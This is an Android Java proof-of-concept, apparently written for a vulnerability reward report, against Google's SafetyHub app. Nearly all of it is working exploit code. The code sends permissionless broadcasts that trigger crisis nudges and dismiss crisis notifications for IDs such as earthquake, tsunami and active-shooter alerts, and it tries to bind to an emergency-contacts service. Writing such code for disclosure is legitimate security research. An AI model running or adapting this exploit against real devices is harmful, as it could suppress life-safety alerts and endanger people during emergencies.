package com.vrp.poc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import android.widget.ScrollView;

public class CrisisNotifDismissActivity extends Activity {
    private static final String TAG = "CrisisNotifDismiss";
    private StringBuilder log = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        TextView tv = new TextView(this);
        tv.setPadding(20, 20, 20, 20);
        tv.setTextSize(14);
        sv.addView(tv);
        setContentView(sv);

        log.append("=== SafetyHub Crisis Notification Dismiss PoC ===\n");
        log.append("VRP Report #35\n\n");
        log.append("Target: CrisisNotificationBroadcastReceiver_Receiver\n");
        log.append("Package: com.google.android.apps.safetyhub\n");
        log.append("Permissions required: NONE\n\n");

        ComponentName target = new ComponentName(
            "com.google.android.apps.safetyhub",
            "com.google.android.apps.safetyhub.crisis.notifications.impl.CrisisNotificationBroadcastReceiver_Receiver"
        );

        // Test 1: Trigger crisis nudge (creates notification)
        log.append("[TEST 1] Sending nudge_crisis broadcast...\n");
        try {
            Intent nudge = new Intent("com.google.android.apps.safetyhub.nudge_crisis");
            nudge.setComponent(target);
            sendBroadcast(nudge);
            log.append("[OK] nudge_crisis broadcast sent successfully\n");
            log.append("     → CrisisNotificationNudgeWorker should be scheduled\n\n");
        } catch (Exception e) {
            log.append("[FAIL] " + e.getMessage() + "\n\n");
        }

        // Test 2: Dismiss crisis notification with various crisis IDs
        String[] crisisIds = {
            "earthquake_alert",
            "tsunami_warning",
            "active_shooter",
            "severe_weather",
            "flood_warning",
            "test_crisis_id_001"
        };

        log.append("[TEST 2] Sending ACTION_DISMISS_NOTIFICATION broadcasts...\n");
        for (String crisisId : crisisIds) {
            try {
                Intent dismiss = new Intent("com.google.android.apps.safetyhub.crisis.ACTION_DISMISS_NOTIFICATION");
                dismiss.setComponent(target);
                dismiss.putExtra("extra.crisis.id", crisisId);
                dismiss.putExtra("extra.crisis.notif.post.timestamp.ms", System.currentTimeMillis());
                sendBroadcast(dismiss);
                log.append("[OK] Dismiss sent for crisis ID: " + crisisId + "\n");
            } catch (Exception e) {
                log.append("[FAIL] " + crisisId + ": " + e.getMessage() + "\n");
            }
        }

        log.append("\n[TEST 3] Testing EmergencyContactsEndpointService binding...\n");
        try {
            Intent bindIntent = new Intent();
            bindIntent.setComponent(new ComponentName(
                "com.google.android.apps.safetyhub",
                "com.google.android.apps.safetyhub.emergencycontacts.server.EmergencyContactsEndpointService"
            ));
            boolean bound = bindService(bindIntent, new android.content.ServiceConnection() {
                @Override
                public void onServiceConnected(ComponentName name, android.os.IBinder service) {
                    Log.d(TAG, "EmergencyContactsEndpointService CONNECTED: " + name);
                }
                @Override
                public void onServiceDisconnected(ComponentName name) {
                    Log.d(TAG, "EmergencyContactsEndpointService disconnected");
                }
            }, BIND_AUTO_CREATE);
            log.append(bound ? "[OK] Bound to EmergencyContactsEndpointService!\n" :
                "[FAIL] Could not bind to service\n");
        } catch (SecurityException se) {
            log.append("[BLOCKED] " + se.getMessage() + "\n");
        } catch (Exception e) {
            log.append("[ERROR] " + e.getMessage() + "\n");
        }

        log.append("\n=== Results ===\n");
        log.append("If broadcasts were sent without SecurityException,\n");
        log.append("the receiver is confirmed unprotected.\n");
        log.append("Check logcat for CrisisNotification* tags.\n");
        log.append("\nIMPACT: Zero-permission app can dismiss\n");
        log.append("safety-critical crisis alerts (earthquakes,\n");
        log.append("tsunamis, active shooter, severe weather).\n");

        tv.setText(log.toString());
        Log.d(TAG, log.toString());
    }
}
